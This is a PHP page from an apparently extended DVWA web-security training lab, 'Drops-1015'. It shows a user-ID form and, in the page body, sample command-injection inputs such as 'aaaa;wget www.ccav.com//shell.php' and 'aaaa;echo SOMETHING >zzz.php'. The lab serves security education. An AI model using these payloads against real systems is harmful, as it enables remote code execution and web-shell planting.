<?php

define( 'DVWA_WEB_PAGE_TO_ROOT', '../../' );
require_once DVWA_WEB_PAGE_TO_ROOT.'dvwa/includes/dvwaPage.inc.php';

dvwaPageStartup( array( 'authenticated', 'phpids' ) );

$page = dvwaPageNewGrab();
$page[ 'title' ] .= $page[ 'title_separator' ].'Drops-1015';
$page[ 'page_id' ] = 'Drops-1015';

dvwaDatabaseConnect();

$vulnerabilityFile = '';
switch( $_COOKIE[ 'security' ] ) {
	case 'low':
		$vulnerabilityFile = 'low.php';
		break;

	case 'medium':
		$vulnerabilityFile = 'medium.php';
		break;

	case 'high':
	default:
		$vulnerabilityFile = 'high.php';
		break;
}

require_once DVWA_WEB_PAGE_TO_ROOT."vulnerabilities/Drops-1015/source/{$vulnerabilityFile}";

$page[ 'help_button' ] = 'Drops-1015';
$page[ 'source_button' ] = 'Drops-1015';

$magicQuotesWarningHtml = '';

// Check if Magic Quotes are on or off
if( ini_get( 'magic_quotes_gpc' ) == true ) {
	$magicQuotesWarningHtml = "	<div class=\"warning\">Magic Quotes are on, you will not be able to inject SQL.</div>";
}

$page[ 'body' ] .= "
<div class=\"body_padded\">

	<HeadlineFont><span class=\"label label-primary\">Drops-1015</span></HeadlineFont>

	<br>	<br>	<br>	<br>	<br>

	{$magicQuotesWarningHtml}

	<div class=\"vulnerable_code_area\">

		<div class=\"well\">
		你可能会输入如下所示的字符:<br>
		aaaa;echo SOMETHING >zzz.php<br>
		aaaa;wget www.ccav.com//shell.php<br>
		aaaa;wget -r 2130706433<br>
		aaaa;cat z1 > `cat z2`<br>
		aaaa;echo > test*php<br>
		</div>
		<h3>Login User ID:</h3>

		<form action=\"#\" method=\"GET\">
			<input type=\"text\" name=\"id\" class=\"form-control\" style=\"width:50%;\">
			<input type=\"submit\" name=\"Submit\" value=\"Submit\" class=\"btn btn-lg btn-info\">
		</form>

		{$html}


	</div>

	<br>
	<br>
	<br>
	<div class=\"panel panel-primary\">
            <div class=\"panel-heading\">
              <h3 class=\"panel-title\">Original Bug Report</h3>
            </div>
            <div class=\"panel-body\">
              	<li>".dvwaExternalLinkUrlGet( 'http://drops.wooyun.org/papers/1015')."</li>
            </div>
       </div>

</div>
";

dvwaHtmlEcho( $page );

?>
